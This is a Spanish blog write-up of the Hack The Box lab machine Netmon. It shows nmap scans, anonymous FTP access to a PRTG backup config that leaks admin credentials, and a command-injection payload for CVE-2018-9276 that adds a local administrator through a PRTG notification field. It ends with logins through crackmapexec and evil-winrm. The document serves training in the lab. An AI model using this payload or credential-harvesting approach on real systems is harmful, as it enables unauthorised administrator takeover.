---
layout: single
title: Netmon - Hack The Box
excerpt: "Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio."
date: 2023-01-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-netmon/netmon_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - SMB
  - PRTG Network Monitor
  - FTP Enumeration
  - Remote Code Execution (Authenticated) 
  - RCE(A) - CVE-2018-9276
  - OSCP Style
---
![](/assets/images/htb-writeup-netmon/netmon_logo.png)
Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Puerto 80</a></li>
				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
				<li><a href="#PRTG">Investigando Servicio PRTG Network Monitor</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Busqueda">Buscando Archivos Críticos de PRTG en Servicio FTP</a></li>
				<li><a href="#FTP2">Analizando Contenido Descargado del Servicio FTP</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#Exploit">Buscando y Analizando Exploit</a></li>
				<li><a href="#Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</a></li>
				<li><a href="#Root">Accediendo a la Máquina como Administrador</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Realizamos un ping para saber si la máquina está conectada y para saber qué sistema operativo tiene, analizando el TTL.
```
ping -c 4 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=129 ms
64 bytes from 10.10.10.152: icmp_seq=2 ttl=127 time=128 ms
64 bytes from 10.10.10.152: icmp_seq=3 ttl=127 time=129 ms
64 bytes from 10.10.10.152: icmp_seq=4 ttl=127 time=132 ms

--- 10.10.10.152 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3012ms
rtt min/avg/max/mdev = 128.379/129.681/131.953/1.365 ms
```
Observamos que es una máquina Windows gracias al TLL. Ahora analicemos los puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

Hacemos un escaneo de puertos para saber cuáles están abiertos y asi poder analizar los servicios que operan en estos:
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 13:32 CST
Initiating SYN Stealth Scan at 13:32
Scanning 10.10.10.152 [65535 ports]
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Completed SYN Stealth Scan at 13:33, 27.19s elapsed (65535 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (1.3s latency).
Scanned at 2023-01-16 13:32:46 CST for 27s
Not shown: 55540 filtered tcp ports (no-response), 9990 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 127
80/tcp  open  http         syn-ack ttl 127
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
           Raw packets sent: 126822 (5.580MB) | Rcvd: 10051 (402.100KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP SYN port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Vemos varios puertos abiertos siendo el FTP, Web y SMB. Ahora vamos a analizar los servicios que hay en estos puertos.

<h2 id="Servicios">Escaneo de Servicios</h2>

Una vez realizado el escaneo de puertos, hacemos un escaneo de servicios. Veamos con que nos encontramos:
```
nmap -sC -sV -p21,80,135,139,445 10.10.10.152 -oN targeted     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 13:34 CST
Nmap scan report for 10.10.10.152
Host is up (0.13s latency).

PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-16T19:34:28
|_  start_date: 2023-01-16T19:30:07
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.51 seconds
```
* -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
* -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
* -p: Para indicar puertos especificos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Observamos que el servicio FTP tiene activo el login como **Anonymous** por lo que podemos empezar por ahí nuestra búsqueda de acceso a la máquina, tambien vemos el servicio SMB activo que podemos analizar después y por último vemos un servicio web abierto que podemos analizar a continuación.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="HTTP">Analizando Puerto 80</h2>

Como mencione anteriormente, vamos a analizar la página web abierta antes de ir al serivico FTP, usaremos la herramienta **whatweb** para esto:

```
http://10.10.10.152/ [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]                                
ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
```
Qué curioso error, una vez que entramos a la página web, vemos el servicio que está usando, **PRTG Network Monitor (Netmon)**

¿Pero que chuchas es este servicio?:

**PRTG es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.**

![](/assets/images/htb-writeup-netmon/Captura1.png)

Osease que monitorea redes, quizá nos sirva después pero ahora vamos a ir primero por el servicio FTP.

<h2 id="FTP">Enumeración Servicio FTP</h2>

Para entrar es tan simple como usar el usuario **anonymous** y poner una contraseña cualquiera:
```
ftp 10.10.10.152 
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```
Bien, una vez dentro, vamos a investigar que hay dentro y a buscar la sección de usuarios para ver si podemos acceder a alguno:
```
ftp> ls
229 Entering Extended Passive Mode (|||50290|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50292|)
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
```
Vemos 2 usuarios, no creo que podamos entrar al administrador, pero al **Public** sí que podremos:
```
ftp> cd Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50294|)
150 Opening ASCII mode data connection.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
03-20-23  03:30PM                   34 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
```
Vaya, vaya. Tan solo descargamos el archivo con el comando **get** y ya lo podremos leer. ¿Pero entonces como accedemos como root? Sigamos buscando a ver con que nos encontramos.

Una pista de lo que podemos buscar es algún archivo o algo que nos pueda resultar útil del **servicio PRTG Network Monitor**, así que investiguemos donde se guardan los archivos de este servicio:

<h2 id="PRTG">Investigando Servicio PRTG Network Monitor</h2>

**Directorio de programas:**
* Sistemas de 32 bits: % archivos de programa% \ PRTG Network Monitor
* Sistemas de 64 bits: % archivos de programa (x86)% \ PRTG Network Monitor

**Para encontrar el camino correcto para la instalación de PRTG, por favor búsquelo en las propiedades de los iconos de PRTG el menú de inicio.Nota: Windows ProgramData está oculta por defecto.**

**Directorio de datos de PRTG:**
* % programdata% \ Paessler \ PRTG Network Monitor -> Almacenamiento de datos

Ojito con lo siguiente:
**Archivos y subcarpetas en el directorio de datos de PRTG**
**Los siguientes archivos se almacenan en el directorio de datos de PRTG:**
* PRTG Configuration.dat: Configuración de monitoreo (por ejemplo, sondas, grupos, dispositivos, sensores, usuarios, mapas, informes y más)
* Configuración de PRTG.old: Copia de seguridad de la versión anterior de la configuración de monitoreo

**Aquí podemos ver más información:** 
* https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/

Empecemos a explotar las vulnerabilidades.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Busqueda">Buscando Archivos Críticos de PRTG en Servicio FTP</h2>

Muy bien, ahora sabemos que podemos buscar dentro del servicio FTP para no estar dando tantas vueltas o buscando cosas que no sirven.
```
ftp> ls -la
229 Entering Extended Passive Mode (|||50613|)
125 Data connection already open; Transfer starting.
11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
03-20-23  03:30PM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
12-15-21  10:40AM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd ProgramData
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50615|)
125 Data connection already open; Transfer starting.
12-15-21  10:40AM       <DIR>          Corefig
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd Paessler
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50619|)
150 Opening ASCII mode data connection.
03-20-23  04:12PM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd PRTG\ Network\ Monitor
250 CWD command successful.
```
Una vez dentro de la carpeta donde están los archivos ocultos, descargamos él **.dat**, él **.old** y él **old.bak**, como investigamos anteriormente, sabemos que él **.dat** y él **.old** son lo mismo, siendo que el **.old** es un **BackUp** del **.dat**, así que descargaremos únicamente los **.dat** y él **.old.bak**. Lo que buscamos es ver si estos archivos contienen un usuario y contraseña que nos permitan acceder a la página.

<h2 id="FTP2">Analizando Contenido Descargado del Servicio FTP</h2>

Ahora toca analizar los archivos que descargamos, recuerda que buscamos un usuario y contraseña para poder acceder a la página web.
```
cat PRTG\ Configuration.dat 
<?xml version="1.0" encoding="UTF-8"?>
  <root version="16" oct="PRTG Network Monitor 18.1.37.13946" saved="2/26/2019 2:54:23 AM" max="2017" guid="{221B25D6-9282-418B-8364-F59561032EE3}" treeversion="0" created="2019-02-02-23-18-27" trial="42f234beedd545338910317db1fca74dbe84030f">
    <statistics time="26-02-2019 02:50:23">
      <statistic name="State Changes">
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,3
      </statistic>
      <statistic name="Reports Generated">
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
      </statistic>
...
...
...
```
Al hacer un **cat** al archivo **.dat** vemos que hay demasiados datos por lo que hay que analizarlos de otra forma, ya que si vemos él **.old.bak** será lo mismo, demasiados datos. Vamos a usar el comando **diff** para ver las diferencias, junto con el comando **less** para ver el **output** como una página e ir viendo poco a poco toda la información, con el fin de ver si hay alguna diferencia entre estos dos archivos:
```
>       <geostat day="03-02-2019"/>
144,146c141,142
<               <flags>
<                 <encrypted/>
<               </flags>
---
>             <!-- User: prtgadmin -->
>             PrTg@dmin2018
317c313
<                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====

```
AHI ESTA!!! Nuestro usuario y contraseña que necesitamos, ahora vamos a autenticarnos:

![](/assets/images/htb-writeup-netmon/Captura2.png)


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Exploit">Buscando y Analizando Exploit</h2>

Una vez dentro, ya podemos buscar un Exploit que nos sirva porque ya tenemos la versión que esta usando el servicio PRGT:
```
searchsploit prtg
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                        | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                       | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                    | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                     | java/webapps/34108.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Vamos a analizar este Exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution**.
```
./Remote_Code_Execution.sh

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 
 EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
```
El Exploit nos pide una cookie, no sé por qué razón, pero lo que nos da a entender es que, una vez auntenticados en la página, es posible vulnerar el sistema e incluso viene la referencia del blog en la que se basó el Exploit, así que veamos dicho blog: 
* https://www.codewatch.org/blog/?p=453

<h3 id="Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</h3>

En resumen, podemos vulnerar la página usando las notificaciones, vamos a hacerlo de este modo:

![](/assets/images/htb-writeup-netmon/Captura3.png)

![](/assets/images/htb-writeup-netmon/Captura4.png)

Nos vamos a la sección de crear nueva notificación:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura5.png">
</p>

Llamamos a nuestra notificación **HackeadoPrro!** y nos vamos a la sección **Execute Programs**:

![](/assets/images/htb-writeup-netmon/Captura6.png)

Ahí lo que haremos será casi lo mismo que en el blog, la diferencia va a radicar en que nosotros vamos a agregar el usuario al grupo de administradores, con el fin de poder loguearnos y ser root. 

Esto es lo mismo que hace el Exploit pero nosotros lo vamos a indicar directamente en la inyección a diferencia del Exploit que usa la cookie para hacer esta movida, este será el código que ejecutara:
```
test.txt;net user BerserkP B3rs3rkP123$! /add; net localgroup Administrators BerserkP /add
```

Cuando guardemos la notificación, ya estará disponible:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura7.png">
</p>

Y la activamos, una vez activada nos deberá mandar el siguiente mensaje:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura8.png">
</p>

Bien ahora para poder ver si ya estamos dentro de dicho grupo, vamos a usar la herramienta **crackmapexec**:
```
crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (HackeadoPrro!)
```
<h2 id="Root">Accediendo a la Máquina como Administrador</h2>

Vemos que ya está nuestro usuario, ahora lo que sigue será conectarnos ya directamente, para esto usaremos la herramienta **evilWirm**:
```
evil-winrm -i 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\BerserkP\Documents> whoami
netmon\berserkp
```
Ya solo es cuestión de buscar la flag del root, que siempre está en el escritorio del usuario Administrator y listo.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>


* https://www.cvedetails.com/cve/CVE-2018-9276/
* https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html **Nota:** Aquí hay varios Exploits para usar contra la versión de este servicio.
* https://packetstormsecurity.com/files/148334/PRTG-Command-Injection.html 
* https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/
* https://www.mundodeportivo.com/urbantecno/windows/agrega-un-usuario-al-grupo-de-administradores-local-en-windows-via-comando
* https://www.ngi.es/crackmapexec-post-explotacion-entornos-active-directory/
* https://thehackerway.com/2021/11/04/evil-winrm-shell-sobre-winrm-para-pentesting-en-sistemas-windows-parte-1-de-2/
* https://www.youtube.com/watch?v=aPS0VIIL0nQ


<br>
# FIN